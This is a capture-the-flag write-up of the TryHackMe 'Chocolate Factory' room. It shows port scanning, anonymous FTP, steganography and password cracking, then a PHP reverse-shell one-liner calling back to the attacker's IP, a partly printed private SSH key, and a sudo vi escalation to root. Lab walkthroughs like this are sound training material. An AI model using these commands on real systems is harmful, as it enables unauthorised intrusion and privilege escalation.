## 🍫Chocolate Factory
https://tryhackme.com/room/chocolatefactory

### 🍫Enum
```
nmap -Pn -sC -sV -sT 10.10.90.244 -vv
```

```
Discovered open port 21/tcp on 10.10.90.244
Discovered open port 111/tcp on 10.10.90.244
Discovered open port 22/tcp on 10.10.90.244
Discovered open port 113/tcp on 10.10.90.244
Discovered open port 110/tcp on 10.10.90.244
Discovered open port 80/tcp on 10.10.90.244
Discovered open port 125/tcp on 10.10.90.244
Discovered open port 119/tcp on 10.10.90.244
Discovered open port 100/tcp on 10.10.90.244
Discovered open port 109/tcp on 10.10.90.244
Discovered open port 106/tcp on 10.10.90.244

PORT      STATE    SERVICE     REASON      VERSION
21/tcp    open     ftp         syn-ack     vsftpd 3.0.3
|_auth-owners: ERROR: Script execution failed (use -d to debug)
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-rw-r--    1 1000     1000       208838 Sep 30  2020 gum_room.jpg
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.18.90.2
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp    open     ssh         syn-ack     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 16:31:bb:b5:1f:cc:cc:12:14:8f:f0:d8:33:b0:08:9b (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCuEAWoQHbW+vehIUZLTiJyXKjUAAJP0sgW/P0LHVaf4C5+1oEBXcDBBZC7SoL6MTMYn8zlEfhCbjQb7A/Yf2IxLzU5f35yuhEbWEvYmuP4PmBB04CJdDItU0xwAbGsufyzZ6td6LKm+oim8xJn/lVTeykVZTASF9iuY9tqwA933AfjqKlNByj82TAmlVkQ93bq+e7Gu/pRkSn++RkIUd4f8ogmLLusEh+vbGkZDj4UdwTIZbOSeuS4oz/umpkJPhekGVoyzjPMRIq9cwdeKIVRwUNbp4BoJjYKjbCC9YY8u/7O6lhtwo4uAp7Q9PfRRCiCpVimm6kIgBmgqqKbueDl
|   256 e7:1f:c9:db:3e:aa:44:b6:72:10:3c:ee:db:1d:33:90 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAYfNs0w6oOdzMM4B2JyB5pWr1qq9oB+xF0Voyn4gBYEGPC9+dqPudYagioH1ArjIHZFF0G24rt7L/6x1OPJSts=
|   256 b4:45:02:b6:24:8e:a9:06:5f:6c:79:44:8a:06:55:5e (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAwurtl1AFxJU7cHOfbCNr34YoTmAVnVUIXt4QHPD1B2
|_auth-owners: ERROR: Script execution failed (use -d to debug)
80/tcp    open     http        syn-ack     Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-methods:
|_  Supported Methods: GET POST OPTIONS HEAD
|_auth-owners: ERROR: Script execution failed (use -d to debug)
|_http-title: Site doesn't have a title (text/html).
100/tcp   open     newacct?    syn-ack
| fingerprint-strings:
|   GenericLines, NULL:
|     "Welcome to chocolate room!!
|     ___.---------------.
|     .'__'__'__'__'__,` . ____ ___ \r
|     _:\x20 |:. \x20 ___ \r
|     \'__'__'__'__'_`.__| `. \x20 ___ \r
|     \'__'__'__\x20__'_;-----------------`
|     \|______________________;________________|
|     small hint from Mr.Wonka : Look somewhere else, its not here! ;)
|_    hope you wont drown Augustus"
|_auth-owners: ERROR: Script execution failed (use -d to debug)
106/tcp   open     pop3pw?     syn-ack
| fingerprint-strings:
|   GenericLines, NULL:
|     "Welcome to chocolate room!!
|     ___.---------------.
|     .'__'__'__'__'__,` . ____ ___ \r
|     _:\x20 |:. \x20 ___ \r
|     \'__'__'__'__'_`.__| `. \x20 ___ \r
|     \'__'__'__\x20__'_;-----------------`
|     \|______________________;________________|
|     small hint from Mr.Wonka : Look somewhere else, its not here! ;)
|_    hope you wont drown Augustus"
|_auth-owners: ERROR: Script execution failed (use -d to debug)
109/tcp   open     pop2?       syn-ack
|_auth-owners: ERROR: Script execution failed (use -d to debug)
| fingerprint-strings:
|   GetRequest, HTTPOptions:
|     "Welcome to chocolate room!!
|     ___.---------------.
|     .'__'__'__'__'__,` . ____ ___ \r
|     _:\x20 |:. \x20 ___ \r
|     \'__'__'__'__'_`.__| `. \x20 ___ \r
|     \'__'__'__\x20__'_;-----------------`
|     \|______________________;________________|
|     small hint from Mr.Wonka : Look somewhere else, its not here! ;)
|_    hope you wont drown Augustus"
110/tcp   open     pop3?       syn-ack
|_auth-owners: ERROR: Script execution failed (use -d to debug)
| fingerprint-strings:
|   GenericLines, NULL:
|     "Welcome to chocolate room!!
|     ___.---------------.
|     .'__'__'__'__'__,` . ____ ___ \r
|     _:\x20 |:. \x20 ___ \r
|     \'__'__'__'__'_`.__| `. \x20 ___ \r
|     \'__'__'__\x20__'_;-----------------`
|     \|______________________;________________|
|     small hint from Mr.Wonka : Look somewhere else, its not here! ;)
|_    hope you wont drown Augustus"
111/tcp   open     rpcbind?    syn-ack
| fingerprint-strings:
|   NULL, RPCCheck:
|     "Welcome to chocolate room!!
|     ___.---------------.
|     .'__'__'__'__'__,` . ____ ___ \r
|     _:\x20 |:. \x20 ___ \r
|     \'__'__'__'__'_`.__| `. \x20 ___ \r
|     \'__'__'__\x20__'_;-----------------`
|     \|______________________;________________|
|     small hint from Mr.Wonka : Look somewhere else, its not here! ;)
|_    hope you wont drown Augustus"
|_auth-owners: ERROR: Script execution failed (use -d to debug)
113/tcp   open     ident?      syn-ack
| fingerprint-strings:
|   FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, NULL, RTSPRequest, TLSSessionReq, WMSRequest:
|_    http://localhost/key_rev_key <- You will find the key here!!!
|_auth-owners: ERROR: Script execution failed (use -d to debug)
119/tcp   open     nntp?       syn-ack
| fingerprint-strings:
|   GenericLines, NULL:
|     "Welcome to chocolate room!!
|     ___.---------------.
|     .'__'__'__'__'__,` . ____ ___ \r
|     _:\x20 |:. \x20 ___ \r
|     \'__'__'__'__'_`.__| `. \x20 ___ \r
|     \'__'__'__\x20__'_;-----------------`
|     \|______________________;________________|
|     small hint from Mr.Wonka : Look somewhere else, its not here! ;)
|_    hope you wont drown Augustus"
|_auth-owners: ERROR: Script execution failed (use -d to debug)
125/tcp   open     locus-map?  syn-ack
| fingerprint-strings:
|   GenericLines, NULL:
|     "Welcome to chocolate room!!
|     ___.---------------.
|     .'__'__'__'__'__,` . ____ ___ \r
|     _:\x20 |:. \x20 ___ \r
|     \'__'__'__'__'_`.__| `. \x20 ___ \r
|     \'__'__'__\x20__'_;-----------------`
|     \|______________________;________________|
|     small hint from Mr.Wonka : Look somewhere else, its not here! ;)
|_    hope you wont drown Augustus"
|_auth-owners: ERROR: Script execution failed (use -d to debug)
666/tcp   filtered doom        no-response
1187/tcp  filtered alias       no-response
2710/tcp  filtered sso-service no-response
3766/tcp  filtered sitewatch-s no-response
3801/tcp  filtered ibm-mgr     no-response
6006/tcp  filtered X11:6       no-response
49160/tcp filtered unknown     no-response
8 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
```
🍫 http://localhost/key_rev_key <- You will find the key here!!!

```
ftp> open 10.10.90.244
Connected to 10.10.90.244.
220 (vsFTPd 3.0.3)
Name (10.10.90.244:root): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||18314|)
150 Here comes the directory listing.
-rw-rw-r--    1 1000     1000       208838 Sep 30  2020 gum_room.jpg
ftp> get gum_room.jpg
local: gum_room.jpg remote: gum_room.jpg
229 Entering Extended Passive Mode (|||21199|)
150 Opening BINARY mode data connection for gum_room.jpg (208838 bytes).
100% |****************************************************************|   203 KiB   57.49 KiB/s    00:00 ETA
226 Transfer complete.
ftp> close
221 Goodbye.
```
![image](https://user-images.githubusercontent.com/6504854/183288285-c93b425c-8115-4e69-a88b-2bc0a00b042e.png)

![image](https://user-images.githubusercontent.com/6504854/183288321-2d6fa134-f4c8-4c0d-bada-bc061e9ea235.png)

```
wget http://10.10.81.66/key_rev_key
```

```
file key_rev_key
```
```
key_rev_key: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=8273c8c59735121c0a12747aee7ecac1aabaf1f0, not stripped
```

```
chmod +x key_rev_key

./key_rev_key
Enter your name: Charlie
Bad name!

./key_rev_key
Enter your name: charlie
Bad name!

 strings key_rev_key | more
/lib64/ld-linux-x86-64.so.2
Enter your name:

 congratulations you have found the key:
b'***********************************************'
Keep its safe
```
🍫 I got key but no credentials....now I investigate gum.jpg.

```
steghide extract -sf gum_room.jpg
Enter passphrase:
the file "b64.txt" does already exist. overwrite ? (y/n) y
wrote extracted data to "b64.txt".

cat b64.txt
ZGFlbW9uOio6MTgzODA6MDo5OTk5OTo3Ojo6CmJpbjoqOjE4MzgwOjA6OTk5OTk6Nzo6OgpzeXM6
KjoxODM4MDowOjk5OTk5Ojc6OjoKc3luYzoqOjE4MzgwOjA6OTk5OTk6Nzo6OgpnYW1lczoqOjE4
MzgwOjA6OTk5OTk6Nzo6OgptYW46KjoxODM4MDowOjk5OTk5Ojc6OjoKbHA6KjoxODM4MDowOjk5
OTk5Ojc6OjoKbWFpbDoqOjE4MzgwOjA6OTk5OTk6Nzo6OgpuZXdzOio6MTgzODA6MDo5OTk5OTo3
Ojo6CnV1Y3A6KjoxODM4MDowOjk5OTk5Ojc6OjoKcHJveHk6KjoxODM4MDowOjk5OTk5Ojc6OjoK
d3d3LWRhdGE6KjoxODM4MDowOjk5OTk5Ojc6OjoKYmFja3VwOio6MTgzODA6MDo5OTk5OTo3Ojo6
```
![image](https://user-images.githubusercontent.com/6504854/183288676-ca824596-45b7-4cce-a19d-4156dbc162fc.png)

```
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```
🍫 I got charlie's pass.

```
ssh charlie@10.10.26.210
charlie@10.10.26.210's password:
Permission denied, please try again.
```
🍫 damn...

![image](https://user-images.githubusercontent.com/6504854/183288830-b5d39789-ee39-4940-afda-90f0281a701a.png)
![image](https://user-images.githubusercontent.com/6504854/183288849-539744d8-5ff0-4d8b-875d-9aef8b500010.png)

🍫 I loggined success and used OS Command.
```
php -r '$sock=fsockopen("10.18.90.2",4444);exec("sh <&3 >&3 2>&3");'
```
![image](https://user-images.githubusercontent.com/6504854/183288946-3695d59b-a10f-498e-9e17-b338876663c7.png)


### 🍫Flag
```
nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.18.90.2] from (UNKNOWN) [10.10.119.168] 45098
ls
home.jpg
home.php
image.png
index.html
index.php.bak
key_rev_key
validate.php
id
uid=33(www-data) gid=33(www-data) groups=33(www-data),0(root),27(sudo)

cd /home
ls
charlie

python3 -c "import pty;pty.spawn('/bin/bash')"

www-data@chocolate-factory:/home$ cd charlie
cd charlie

www-data@chocolate-factory:/home/charlie$ ls
ls
teleport  teleport.pub  user.txt

cat user.txt
cat: user.txt: Permission denied

cat teleport
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA4adrPc3Uh98RYDrZ8CUBDgWLENUybF60lMk9YQOBDR+gpuRW
1AzL12K35/Mi3Vwtp0NSwmlS7ha4y9sv2kPXv8lFOmLi1FV2hqlQPLw/unnEFwUb
L4KBqBemIDefV5pxMmCqqguJXIkzklAIXNYhfxLr8cBS/HJoh/7qmLqrDoXNhwYj
B3zgov7RUtk15Jv11D0Itsyr54pvYhCQgdoorU7l42EZJayIomHKon1jkofd1/oY
fOBwgz6JOlNH1jFJoyIZg2OmEhnSjUltZ9mSzmQyv3M4AORQo3ZeLb+zbnSJycEE
```
```
ssh charlie@10.10.119.168 -i charlie_rsa
```
```
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-115-generic x86_64)

charlie@chocolate-factory:/home/charlie$ ls
teleport  teleport.pub  user.txt
charlie@chocolate-factory:/home/charlie$ cat user.txt
flag{*********************************}

charlie@chocolate-factory:/home/charlie$ sudo -l
Matching Defaults entries for charlie on chocolate-factory:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User charlie may run the following commands on chocolate-factory:
    (ALL : !root) NOPASSWD: /usr/bin/vi
```
 
```
charlie@chocolate-factory:/home/charlie$ sudo vi -c ':!/bin/sh' /dev/null

# id
uid=0(root) gid=0(root) groups=0(root)
# ls /root
root.py
# python /root/root.py
Enter the key:  b'****************************************************'
__   __               _               _   _                 _____ _
\ \ / /__  _   _     / \   _ __ ___  | \ | | _____      __ |_   _| |__   ___
 \ V / _ \| | | |   / _ \ | '__/ _ \ |  \| |/ _ \ \ /\ / /   | | | '_ \ / _ \
  | | (_) | |_| |  / ___ \| | |  __/ | |\  | (_) \ V  V /    | | | | | |  __/
  |_|\___/ \__,_| /_/   \_\_|  \___| |_| \_|\___/ \_/\_/     |_| |_| |_|\___|

  ___                              ___   __
 / _ \__      ___ __   ___ _ __   / _ \ / _|
| | | \ \ /\ / / '_ \ / _ \ '__| | | | | |_
| |_| |\ V  V /| | | |  __/ |    | |_| |  _|
 \___/  \_/\_/ |_| |_|\___|_|     \___/|_|


  ____ _                     _       _
 / ___| |__   ___   ___ ___ | | __ _| |_ ___
| |   | '_ \ / _ \ / __/ _ \| |/ _` | __/ _ \
| |___| | | | (_) | (_| (_) | | (_| | ||  __/
 \____|_| |_|\___/ \___\___/|_|\__,_|\__\___|

 _____          _
|  ___|_ _  ___| |_ ___  _ __ _   _
| |_ / _` |/ __| __/ _ \| '__| | | |
|  _| (_| | (__| || (_) | |  | |_| |
|_|  \__,_|\___|\__\___/|_|   \__, |
                              |___/

flag{****************************************}
```

🍫Thank you for your time. Enjoy! 😙

チョコレートディスコ。ディスコ。🍫 👯‍♂️ 👯‍♀️ 👯‍♂ 👯‍✨✨

